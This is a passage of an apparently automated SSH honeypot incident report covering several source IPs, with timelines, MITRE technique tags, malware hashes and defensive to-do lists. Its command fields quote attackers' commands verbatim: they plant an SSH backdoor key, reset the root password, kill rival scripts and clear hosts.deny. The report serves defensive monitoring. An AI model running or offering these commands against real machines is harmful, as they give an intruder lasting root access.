| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:14:33` | `cowrie.session.connect` |
| `2026-05-22 04:14:33` | `cowrie.client.version` |
| `2026-05-22 04:14:34` | `cowrie.client.kex` |
| `2026-05-22 04:14:34` | `cowrie.login.success` |
| `2026-05-22 04:14:35` | `cowrie.session.params` |
| `2026-05-22 04:14:35` | `cowrie.command.input` |
| `2026-05-22 04:14:35` | `cowrie.command.failed` |
| `2026-05-22 04:14:35` | `cowrie.log.closed` |
| `2026-05-22 04:14:35` | `cowrie.session.params` |
| `2026-05-22 04:14:35` | `cowrie.command.input` |
| `2026-05-22 04:14:36` | `cowrie.session.file_download` |
| `2026-05-22 04:14:36` | `cowrie.log.closed` |
| `2026-05-22 04:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52a800601642

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:14 |
| **Last Seen** | 2026-05-22 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:14:38` | `cowrie.session.connect` |
| `2026-05-22 04:14:38` | `cowrie.client.version` |
| `2026-05-22 04:14:38` | `cowrie.client.kex` |
| `2026-05-22 04:14:39` | `cowrie.login.success` |
| `2026-05-22 04:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28216fff331e

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:14 |
| **Last Seen** | 2026-05-22 04:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:14:48` | `cowrie.session.connect` |
| `2026-05-22 04:14:48` | `cowrie.client.version` |
| `2026-05-22 04:14:48` | `cowrie.client.kex` |
| `2026-05-22 04:14:49` | `cowrie.login.success` |
| `2026-05-22 04:14:49` | `cowrie.session.params` |
| `2026-05-22 04:14:49` | `cowrie.command.input` |
| `2026-05-22 04:14:49` | `cowrie.command.failed` |
| `2026-05-22 04:14:49` | `cowrie.log.closed` |
| `2026-05-22 04:14:50` | `cowrie.session.params` |
| `2026-05-22 04:14:50` | `cowrie.command.input` |
| `2026-05-22 04:14:50` | `cowrie.session.file_download` |
| `2026-05-22 04:14:50` | `cowrie.log.closed` |
| `2026-05-22 04:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdda3d5f8954

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:14 |
| **Last Seen** | 2026-05-22 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:14:52` | `cowrie.session.connect` |
| `2026-05-22 04:14:52` | `cowrie.client.version` |
| `2026-05-22 04:14:52` | `cowrie.client.kex` |
| `2026-05-22 04:14:53` | `cowrie.login.success` |
| `2026-05-22 04:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9a5d5e5e466

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:15 |
| **Last Seen** | 2026-05-22 04:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:15:02` | `cowrie.session.connect` |
| `2026-05-22 04:15:02` | `cowrie.client.version` |
| `2026-05-22 04:15:02` | `cowrie.client.kex` |
| `2026-05-22 04:15:03` | `cowrie.login.success` |
| `2026-05-22 04:15:03` | `cowrie.session.params` |
| `2026-05-22 04:15:03` | `cowrie.command.input` |
| `2026-05-22 04:15:03` | `cowrie.command.failed` |
| `2026-05-22 04:15:04` | `cowrie.log.closed` |
| `2026-05-22 04:15:04` | `cowrie.session.params` |
| `2026-05-22 04:15:04` | `cowrie.command.input` |
| `2026-05-22 04:15:04` | `cowrie.session.file_download` |
| `2026-05-22 04:15:04` | `cowrie.log.closed` |
| `2026-05-22 04:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42d16de43960

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:15 |
| **Last Seen** | 2026-05-22 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:15:07` | `cowrie.session.connect` |
| `2026-05-22 04:15:07` | `cowrie.client.version` |
| `2026-05-22 04:15:07` | `cowrie.client.kex` |
| `2026-05-22 04:15:08` | `cowrie.login.success` |
| `2026-05-22 04:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e971d56d1c74

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:16 |
| **Last Seen** | 2026-05-22 04:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:16:04` | `cowrie.session.connect` |
| `2026-05-22 04:16:04` | `cowrie.client.version` |
| `2026-05-22 04:16:04` | `cowrie.client.kex` |
| `2026-05-22 04:16:05` | `cowrie.login.success` |
| `2026-05-22 04:16:05` | `cowrie.session.params` |
| `2026-05-22 04:16:05` | `cowrie.command.input` |
| `2026-05-22 04:16:05` | `cowrie.command.failed` |
| `2026-05-22 04:16:06` | `cowrie.log.closed` |
| `2026-05-22 04:16:06` | `cowrie.session.params` |
| `2026-05-22 04:16:06` | `cowrie.command.input` |
| `2026-05-22 04:16:06` | `cowrie.session.file_download` |
| `2026-05-22 04:16:06` | `cowrie.log.closed` |
| `2026-05-22 04:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3cc4d3ca02c

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]60` |
| **First Seen** | 2026-05-22 04:16 |
| **Last Seen** | 2026-05-22 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:16:09` | `cowrie.session.connect` |
| `2026-05-22 04:16:09` | `cowrie.client.version` |
| `2026-05-22 04:16:09` | `cowrie.client.kex` |
| `2026-05-22 04:16:10` | `cowrie.login.success` |
| `2026-05-22 04:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]60` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35dfa946b796

| Field | Detail |
|---|---|
| **Source IP** | `165.154.105[.]128` |
| **First Seen** | 2026-05-22 04:16 |
| **Last Seen** | 2026-05-22 04:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:16:25` | `cowrie.session.connect` |
| `2026-05-22 04:16:25` | `cowrie.client.version` |
| `2026-05-22 04:16:26` | `cowrie.client.kex` |
| `2026-05-22 04:16:26` | `cowrie.login.success` |
| `2026-05-22 04:16:26` | `cowrie.session.params` |
| `2026-05-22 04:16:26` | `cowrie.command.input` |
| `2026-05-22 04:16:26` | `cowrie.command.failed` |
| `2026-05-22 04:16:27` | `cowrie.log.closed` |
| `2026-05-22 04:16:28` | `cowrie.session.params` |
| `2026-05-22 04:16:28` | `cowrie.command.input` |
| `2026-05-22 04:16:28` | `cowrie.session.file_download` |
| `2026-05-22 04:16:28` | `cowrie.log.closed` |
| `2026-05-22 04:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.105[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.105[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c33678714349

| Field | Detail |
|---|---|
| **Source IP** | `165.154.105[.]128` |
| **First Seen** | 2026-05-22 04:16 |
| **Last Seen** | 2026-05-22 04:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:16:29` | `cowrie.session.connect` |
| `2026-05-22 04:16:29` | `cowrie.client.version` |
| `2026-05-22 04:16:30` | `cowrie.client.kex` |
| `2026-05-22 04:16:30` | `cowrie.login.success` |
| `2026-05-22 04:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.105[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.105[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a05ea257e6b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-22 04:25 |
| **Last Seen** | 2026-05-22 04:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:25:14` | `cowrie.session.connect` |
| `2026-05-22 04:25:14` | `cowrie.client.version` |
| `2026-05-22 04:25:14` | `cowrie.client.kex` |
| `2026-05-22 04:25:16` | `cowrie.login.success` |
| `2026-05-22 04:25:16` | `cowrie.session.params` |
| `2026-05-22 04:25:16` | `cowrie.command.input` |
| `2026-05-22 04:25:16` | `cowrie.command.failed` |
| `2026-05-22 04:25:17` | `cowrie.log.closed` |
| `2026-05-22 04:25:17` | `cowrie.session.params` |
| `2026-05-22 04:25:17` | `cowrie.command.input` |
| `2026-05-22 04:25:17` | `cowrie.session.file_download` |
| `2026-05-22 04:25:17` | `cowrie.log.closed` |
| `2026-05-22 04:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e3219a114a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-22 04:25 |
| **Last Seen** | 2026-05-22 04:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:25:21` | `cowrie.session.connect` |
| `2026-05-22 04:25:21` | `cowrie.client.version` |
| `2026-05-22 04:25:21` | `cowrie.client.kex` |
| `2026-05-22 04:25:22` | `cowrie.login.success` |
| `2026-05-22 04:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02b7cc79740

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:27 |
| **Last Seen** | 2026-05-22 04:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:27:38` | `cowrie.session.connect` |
| `2026-05-22 04:27:38` | `cowrie.client.version` |
| `2026-05-22 04:27:38` | `cowrie.client.kex` |
| `2026-05-22 04:27:39` | `cowrie.login.success` |
| `2026-05-22 04:27:40` | `cowrie.session.params` |
| `2026-05-22 04:27:40` | `cowrie.command.input` |
| `2026-05-22 04:27:40` | `cowrie.command.failed` |
| `2026-05-22 04:27:40` | `cowrie.log.closed` |
| `2026-05-22 04:27:40` | `cowrie.session.params` |
| `2026-05-22 04:27:40` | `cowrie.command.input` |
| `2026-05-22 04:27:40` | `cowrie.session.file_download` |
| `2026-05-22 04:27:40` | `cowrie.log.closed` |
| `2026-05-22 04:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bbc49e80894

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:27 |
| **Last Seen** | 2026-05-22 04:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:27:43` | `cowrie.session.connect` |
| `2026-05-22 04:27:43` | `cowrie.client.version` |
| `2026-05-22 04:27:43` | `cowrie.client.kex` |
| `2026-05-22 04:27:44` | `cowrie.login.success` |
| `2026-05-22 04:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29bca6bcff6c

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:32 |
| **Last Seen** | 2026-05-22 04:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:32:07` | `cowrie.session.connect` |
| `2026-05-22 04:32:07` | `cowrie.client.version` |
| `2026-05-22 04:32:07` | `cowrie.client.kex` |
| `2026-05-22 04:32:08` | `cowrie.login.success` |
| `2026-05-22 04:32:08` | `cowrie.session.params` |
| `2026-05-22 04:32:08` | `cowrie.command.input` |
| `2026-05-22 04:32:08` | `cowrie.command.failed` |
| `2026-05-22 04:32:08` | `cowrie.log.closed` |
| `2026-05-22 04:32:09` | `cowrie.session.params` |
| `2026-05-22 04:32:09` | `cowrie.command.input` |
| `2026-05-22 04:32:09` | `cowrie.session.file_download` |
| `2026-05-22 04:32:09` | `cowrie.log.closed` |
| `2026-05-22 04:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57880aab2e5

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-05-22 04:32 |
| **Last Seen** | 2026-05-22 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:32:11` | `cowrie.session.connect` |
| `2026-05-22 04:32:11` | `cowrie.client.version` |
| `2026-05-22 04:32:12` | `cowrie.client.kex` |
| `2026-05-22 04:32:13` | `cowrie.login.success` |
| `2026-05-22 04:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c46b3e9f9047

| Field | Detail |
|---|---|
| **Source IP** | `180.76.184[.]79` |
| **First Seen** | 2026-05-22 04:54 |
| **Last Seen** | 2026-05-22 04:55 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TFp11PifCTZy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 04:54:03` | `cowrie.session.connect` |
| `2026-05-22 04:54:03` | `cowrie.client.version` |
| `2026-05-22 04:54:05` | `cowrie.client.kex` |
| `2026-05-22 04:54:05` | `cowrie.login.success` |
| `2026-05-22 04:54:06` | `cowrie.session.params` |
| `2026-05-22 04:54:06` | `cowrie.command.input` |
| `2026-05-22 04:54:06` | `cowrie.command.failed` |
| `2026-05-22 04:54:07` | `cowrie.log.closed` |
| `2026-05-22 04:54:07` | `cowrie.session.params` |
| `2026-05-22 04:54:07` | `cowrie.command.input` |
| `2026-05-22 04:54:08` | `cowrie.session.file_download` |
| `2026-05-22 04:54:08` | `cowrie.log.closed` |
| `2026-05-22 04:54:25` | `cowrie.session.params` |
| `2026-05-22 04:54:25` | `cowrie.command.input` |
| `2026-05-22 04:54:25` | `cowrie.log.closed` |
| `2026-05-22 04:54:27` | `cowrie.session.params` |
